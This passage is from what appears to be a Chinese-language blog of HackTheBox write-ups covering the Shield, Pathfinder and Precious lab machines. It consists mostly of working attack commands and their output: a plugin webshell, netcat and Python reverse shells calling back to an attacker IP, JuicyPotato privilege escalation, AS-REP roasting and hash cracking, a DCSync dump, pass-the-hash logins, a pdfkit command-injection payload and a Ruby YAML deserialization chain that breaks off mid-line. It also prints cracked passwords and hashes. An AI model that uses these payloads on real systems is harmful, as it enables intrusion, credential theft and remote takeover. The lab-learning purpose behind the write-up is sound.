<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.10.29/wordpress/ -e u</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://10.10.10.29/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>使用上一台靶机的密码<code>P@s5w0rd!</code><br />
得到账户<code>admin:P@s5w0rd!</code><br />
<s>拳头硬了</s></p>
<p>登入之后修改插件的代码<br />
直接写个Shell进去<br />
然后访问<code>/wordpress/wp-content/plugins/mesmerize-companion/src/Companion.php</code>即可</p>
<h2 id="权限提升-18"><a class="markdownIt-Anchor" href="#权限提升-18"></a> 权限提升</h2>
<p>蚁剑连WebShell<br />
上传nc再弹Shell回来</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc64.exe -e C:\windows\system32\cmd.exe 10.10.16.51 9996</span><br><span class="line">-------</span><br><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">Host Name:                 SHIELD</span><br><span class="line">OS Name:                   Microsoft Windows Server 2016 Standard</span><br><span class="line">OS Version:                10.0.14393 N/A Build 14393</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Member Server</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          Windows User</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00376-30000-00299-AA303</span><br><span class="line">Original Install Date:     2/4/2020, 12:58:01 PM</span><br><span class="line">System Boot Time:          6/5/2021, 8:21:33 PM</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              1 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume2</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              en-us;English (United States)</span><br><span class="line">Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</span><br><span class="line">Total Physical Memory:     2,047 MB</span><br><span class="line">Available Physical Memory: 753 MB</span><br><span class="line">Virtual Memory: Max Size:  2,431 MB</span><br><span class="line">Virtual Memory: Available: 1,015 MB</span><br><span class="line">Virtual Memory: In Use:    1,416 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    MEGACORP.LOCAL</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 N/A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: vmxnet3 Ethernet Adapter</span><br><span class="line">                                 Connection Name: Ethernet0 2</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.10.29</span><br><span class="line">                                 [02]: fe80::98f9:2cd0:ff27:3fbc</span><br><span class="line">                                 [03]: dead:beef::98f9:2cd0:ff27:3fbc</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="keyword">for</span> Hyper-V will not be displayed.</span><br></pre></td></tr></table></figure>
<p>没有打补丁的Windows Server 2016 Standard<br />
用烂土豆提权<br />
<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe">https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</a></p>
<p>写一个反弹Shell的bat脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> start C:\temp\nc64.exe -e cmd.exe 10.10.16.51 9995 &gt; C:\temp\shell.bat</span><br></pre></td></tr></table></figure>
<p>当时因为用linux的习惯就用了双引号把要写入的内容括了起来, 但是Windows会很蛋疼得把双引号也写入, 然后就导致了当时一直不能提权</p>
<p>看一下权限</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name          Description                               State  </span><br><span class="line">======================= ========================================= =======</span><br><span class="line">SeChangeNotifyPrivilege Bypass traverse checking                  Enabled</span><br><span class="line">SeImpersonatePrivilege  Impersonate a client after authentication Enabled</span><br><span class="line">SeCreateGlobalPrivilege Create global objects                     Enabled</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果开启SeImpersonate权限，juicypotato的参数可以使用-t t<br />
如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u<br />
如果均开启，可以选择-t *<br />
如果均未开启，那么无法提权<br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/god_zzZ/article/details/106334702">https://blog.csdn.net/god_zzZ/article/details/106334702</a></p>
</blockquote>
<p>然后在项目上找一个Windows Server 2016 Standard的CLSID</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p C:\temp\shell.bat -l 6666 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;</span><br><span class="line">------</span><br><span class="line">nc -lvnp 9995</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">6e9a9fdc6f64e410a68b847bb4b404fa</span><br></pre></td></tr></table></figure>
<hr />
<h1 id="hackthebox_pathfinder"><a class="markdownIt-Anchor" href="#hackthebox_pathfinder"></a> HackTheBox_Pathfinder</h1>
<p>对于域控的攻击有点超出的我的知识范围了</p>
<h2 id="端口扫描-19"><a class="markdownIt-Anchor" href="#端口扫描-19"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -p 1-10000 10.10.10.30</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.30</span><br><span class="line">Host is up (0.57s latency).</span><br><span class="line">Not shown: 9987 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-08 13:22:07Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用上一台靶机的凭证<code>sandra:Password1234!</code>来枚举AD的信息 – 官方WP</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d megacorp.local -u sandra -p <span class="string">&quot;Password1234!&quot;</span> -gc pathfinder.megacorp.local -c all -ns 10.10.10.30</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neo4j console</span><br><span class="line">bloodhound</span><br></pre></td></tr></table></figure>
<p>json打包为zip后放进bloodhound<br />
自己用在kali用bloodhound的时候总是莫名其妙的崩溃, 只能在windows上使用了<br />
需要改一下neo4j所监听的ip, 默认是监听本地环回, 需要改成一个windows上能够访问到的ip</p>
<p>通过分析<code>Find Principals with DCSync Rights</code><br />
可以看到用户SVC_BES有权限<code>GetChanges</code>&amp;<code>GetchangesAll</code></p>
<blockquote>
<p>“With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz”<br />
<a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall</a></p>
</blockquote>
<blockquote>
<p>mimikatz有一个dcsync功能, 可以利用卷影拷贝服务直接读取ntds.dll文件并检索域散列值。<br />
《内网安全攻防》 P.296</p>
</blockquote>
<p>如果能够拿到用户<code>svc_bes</code>的凭证, 就能够使用dcsync攻击<br />
所以尝试获取用户<code>svc_bes</code>的Hash</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> svc_bes</span><br><span class="line">$krb5asrep$23<span class="variable">$svc_bes</span>@MEGACORP.LOCAL:9b7a931e1152a4631d23173e921373ee<span class="variable">$7282d47fdf6ebddcd09f8233636ee97c971b39333ded23097d3fb59c4fb1dfbd772cb3b08b8a8f40a69f69a07f242e0ee2520878b707ab9769208ba2bd6faa76c0a79b39384ef588651127c3164fff013b53d0968d4047dad049b46747b52629c6c9b92427fc7bd6dca13a923bdb833ca9273c2018b605a9eeb0c24005b5ba8988b76952db3a31f6b14f165bd0613e7130ee1bc93cb9a0e4f7a018cbf3913b935778e860d3236d2763b56d871e236e98ea041bbb5b15ebf3138ca16214a758b24194d968320151e58d09a89c2d08e4576ab789076cba4096b4fb328965611663cbe588eafd5bf19af71293701d8a220e</span></span><br></pre></td></tr></table></figure>
<p>爆破Hash</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">Sheffield19      ($krb5asrep$23<span class="variable">$svc_bes</span>@MEGACORP.LOCAL)</span><br></pre></td></tr></table></figure>
<p>这里本来打算用psexec直接登入, 但是出现了权限不足的错误<br />
<s><code>python psexec.py megacorp.local/svc_bes@10.10.10.30</code></s></p>
<p>使用Winrm服务登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19</span><br><span class="line"><span class="built_in">type</span> C:\users\svc_bes\desktop\user.txt</span><br><span class="line">b05fb166688a8603d970c6d033f637f1</span><br></pre></td></tr></table></figure>
<p>dcsync攻击</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -dc-ip 10.10.10.30 megacorp.local/svc_bes:Sheffield19@10.10.10.30</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::</span><br></pre></td></tr></table></figure>
<p>使用Hash登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py megacorp.local/administraor@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18</span><br><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">ee613b2d048303e5fd4ac6647d944645</span><br></pre></td></tr></table></figure>
<hr />
<p>几台靶机下来还是学到了不少东西<br />
<s>还是自己太菜了</s><br />
剩下的StartPoint靶机需要VIP才能访问<br />
等哪天心血来潮开了VIP再说吧</p>
<hr />
<h1 id="hackthebox_precious"><a class="markdownIt-Anchor" href="#hackthebox_precious"></a> HackTheBox_Precious</h1>
<h2 id="信息收集-3"><a class="markdownIt-Anchor" href="#信息收集-3"></a> 信息收集</h2>
<h3 id="端口扫描-20"><a class="markdownIt-Anchor" href="#端口扫描-20"></a> 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.189</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> precious.htb (10.10.11.189)</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.18.0</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3>
<p>未枚举出路径</p>
<h2 id="漏洞利用-18"><a class="markdownIt-Anchor" href="#漏洞利用-18"></a> 漏洞利用</h2>
<p>访问80端口的WEB服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.189/ -I</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx&#x2F;1.18.0</span><br><span class="line">Date: Thu, 02 Mar 2023 02:20:41 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 145</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;precious.htb&#x2F;</span><br></pre></td></tr></table></figure>
<p>跳转至域名precious.htb</p>
<p>添加域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.189\tprecious.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<p>使用域名可以进行访问</p>
<p>本地开启HTTP服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp &amp;&amp; python -m http.server 80</span><br></pre></td></tr></table></figure>
<p>将本地HTTP服务页面转为PDF</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://precious.htb -d <span class="string">&quot;url=http://10.10.*.*/&quot;</span> -o pdf</span><br></pre></td></tr></table></figure>
<p>查看文件EXIF信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool pdf</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ExifTool Version Number         : 11.16</span><br><span class="line">File Name                       : pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 22 kB</span><br><span class="line">File Modification Date&#x2F;Time     : 2023:03:02 10:42:26+08:00</span><br><span class="line">File Access Date&#x2F;Time           : 2023:03:02 10:42:33+08:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2023:03:02 10:42:26+08:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application&#x2F;pdf</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Linearized                      : No</span><br><span class="line">Page Count                      : 1</span><br><span class="line">Creator                         : Generated by pdfkit v0.8.6</span><br></pre></td></tr></table></figure>
<p>搜索<code>pdfkit v0.8.6</code>，找到相关漏洞CVE-2022-25765</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795</a></p>
</blockquote>
<p>验证漏洞</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://precious.htb/ -d <span class="string">&quot;url=http%3A//10.10.*.*/%3Fname%3D%2520%60id%60&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.189 - - [02&#x2F;Mar&#x2F;2023 11:34:00] &quot;GET &#x2F;?name&#x3D;%20uid&#x3D;1001(ruby)%20gid&#x3D;1001(ruby)%20groups&#x3D;1001(ruby) HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
<p>反弹Shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://precious.htb/ -d <span class="string">&quot;url=http%3A//10.10.*.*/%3Fname%3D%2520%60python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2710.10.*.*%27%2C9998%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27/bin/bash%27%2C%27-i%27%5D%29%3B%22%60&quot;</span></span><br></pre></td></tr></table></figure>
<p>获取tty</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/ruby/.bundle/config</span><br></pre></td></tr></table></figure>
<p>得到用户henry的账户信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">BUNDLE_HTTPS:&#x2F;&#x2F;RUBYGEMS__ORG&#x2F;: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot;</span><br></pre></td></tr></table></figure>
<p>SSH登入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh henry@10.10.11.189</span><br><span class="line">Q3c1AqGHtoI0aXAYFH</span><br></pre></td></tr></table></figure>
<p>查看flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /home/henry/user.txt </span><br><span class="line">c2495bbeca89a6c2caaabb23a05934a9</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-19"><a class="markdownIt-Anchor" href="#权限提升-19"></a> 权限提升</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for henry on precious:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User henry may run the following commands on precious:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;ruby &#x2F;opt&#x2F;update_dependencies.rb</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat update_dependencies.rb</span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compare installed dependencies with those specified in &quot;dependencies.yml&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;yaml&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rubygems&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> update versions automatically</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_gems</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_from_file</span></span></span><br><span class="line">    YAML.load(File.read(<span class="string">&quot;dependencies.yml&quot;</span>))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_local_gems</span></span></span><br><span class="line">    Gem::Specification.sort_by&#123; <span class="params">|g|</span> [g.name.downcase, g.version] &#125;.map&#123;<span class="params">|g|</span> [g.name, g.version.to_s]&#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">gems_file = list_from_file</span><br><span class="line">gems_local = list_local_gems</span><br><span class="line"></span><br><span class="line">gems_file.each <span class="keyword">do</span> <span class="params">|file_name, file_version|</span></span><br><span class="line">    gems_local.each <span class="keyword">do</span> <span class="params">|local_name, local_version|</span></span><br><span class="line">        <span class="keyword">if</span>(file_name == local_name)</span><br><span class="line">            <span class="keyword">if</span>(file_version != local_version)</span><br><span class="line">                puts <span class="string">&quot;Installed version differs from the one specified in file: &quot;</span> + local_name</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                puts <span class="string">&quot;Installed version is equals to the one specified in file: &quot;</span> + local_name</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>YAML.load()存在反序列化漏洞</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/">https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/</a></p>
</blockquote>
<p>构造能够利用漏洞的yml文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp; vi /tmp/dependencies.yml</span><br></pre></td></tr></table></figure>
<p>文件内容如下</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby/object:Gem::Installer</span></span><br><span class="line">    <span class="attr">i:</span> <span class="string">x</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby/object:Gem::SpecFetcher</span></span><br><span class="line">    <span class="attr">i:</span> <span class="string">y</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby/object:Gem::Requirement</span></span><br><span class="line">  <span class="attr">requirements:</span></span><br><span class="line">    <span class="type">!ruby/object:Gem::Package::TarReader</span></span><br><span class="line">    <span class="attr">io:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Net::BufferedIO</span></span><br><span class="line">      <span class="attr">io:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Gem::Package::TarReader::Entry</span></span><br><span class="line">         <span class="attr">read:</span> <span class="number">0</span></span><br><span class="line">         <span class="attr">header:</span> <span class="string">&quot;abc&quot;</span></span><br><span class="line">      <span class="attr">debug_output:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Net::WriteAdapter</span></span><br><span class="line">         <span class="attr">socket:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Gem::RequestSet</span></span><br><span class="line">             <span class="attr">sets:</span> <span class="type">!ruby/object:Net::WriteAdapter</span></span><br><span class="line">                 <span class="attr">socket:</span> <span class="type">!ruby/module</span> <span class="string">&#x27;Kernel&#x27;</span></span><br><span class="line">                 <span class="attr">method_id:</span> <span class="string">:system</span></span><br><span class="line">             <span class="attr">git_set:</span> <span class="string">&quot;python3 -c \&quot;import 